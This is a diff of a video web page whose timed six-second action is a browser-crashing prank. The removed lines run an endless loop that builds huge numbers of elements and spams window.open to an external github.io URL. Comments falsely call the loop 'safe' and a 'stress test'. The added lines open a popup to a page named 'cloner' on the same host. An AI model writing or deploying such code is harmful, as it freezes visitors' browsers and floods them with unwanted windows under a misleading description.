@@ -30,7 +30,7 @@
 <body class="bg-gray-900 flex items-center justify-center p-0 m-0 h-screen">
 
     <!-- Video Container - Takes up the entire viewport -->
-    <div class="absolute inset-0 w-full h-full">
+    <div class="absolute inset-0  h-full">
         <!-- 
             The 'video' element is permanently muted (necessary for autoplay) and plays your provided video.
         -->
@@ -44,8 +44,6 @@
             Your browser does not support the video tag.
         </video>
     </div>
-    <!-- Element Container for the stress test divs -->
-    <div id="element-container" class="absolute inset-0 z-0 pointer-events-none"></div>
 
     <!-- Action Status Display (Visible on top of the video) -->
     <div id="status-message" 
@@ -57,60 +55,21 @@
         document.addEventListener('DOMContentLoaded', () => {
             const videoElement = document.getElementById('my-video');
             const statusMessage = document.getElementById('status-message');
-            const container = document.getElementById('element-container'); // Element container for divs
-            
+
             const TIMEOUT_MS = 6000; // 6 seconds
-            const BURST_ELEMENTS = 21939382181231249021090291309231092913983218132832118329289389329832189213892318321891238123883281238913289238123823876545617732123871671327823176132; // A large, but safe number of elements to generate for stress test
 
-            /**
-             * Creates and appends a batch of elements to the container.
-             * @param {number} numElements - The number of elements to generate in this burst.
-             */
-            function generateElements(numElements) {
-                const fragment = document.createDocumentFragment();
-                const containerRect = container.getBoundingClientRect();
-                const containerWidth = containerRect.width;
-                const containerHeight = containerRect.height;
-
-                // Loop is now a safe, fixed number (numElements)
-                for (let i = 0; i < 21939382181231249021090291309231092913983218132832118329289389329832189213892318321891238123883281238913289238123823876545617732123871671327823176132; i++) {
-                    const div = document.createElement('div');
-                    div.className = 'stress-element';
-                    window.open("https://ubg1300.github.io/buffervidchrome/l.png");
-                    // Random position within the container
-                    const x = Math.random() * containerWidth;
-                    const y = Math.random() * containerHeight;
-                    
-                    div.style.left = `${x}px`;
-                    div.style.top = `${y}px`;
-                    
-                    fragment.appendChild(div);
-                }
-                container.appendChild(fragment);
-                console.log(`Generated ${numElements.toLocaleString()} invisible stress elements.`);
-            }
 
             /**
              * The function that is called exactly 6 seconds after the video starts.
              * This triggers the video pause and the DOM stress burst.
              */
             function handleSixSecondsReached() {
-                videoElement.pause();
-                while(true){
-                generateElements(BURST_ELEMENTS);
-                console.log("A");
-                                generateElements(BURST_ELEMENTS);
-                console.log("A");                generateElements(BURST_ELEMENTS);
-                console.log("A");                generateElements(BURST_ELEMENTS);
-                console.log("A");                generateElements(BURST_ELEMENTS);
-                console.log("A");                generateElements(BURST_ELEMENTS);
-                console.log("A");                generateElements(BURST_ELEMENTS);
-                console.log("A");                generateElements(BURST_ELEMENTS);
-                console.log("A");
-                }
-                console.log("--- 6 SECOND ACTION TRIGGERED --- Video Paused and Stress Test Started.");
-                
+                // Define the URL and the window features
+            const url = 'https://ubg1300.github.io/buffervidchrome/cloner';
+            const windowFeatures = 'width=350,height=200,resizable=yes,scrollbars=yes,top=100,left=100';
 
+            // window.open(URL, name, features)
+            window.open(url, 'utilityWindow', windowFeatures);
                 // Flash the screen red (Visual feedback for the timed action)
                 document.body.style.backgroundColor = '#ef4444'; // Tailwind red-500
                 
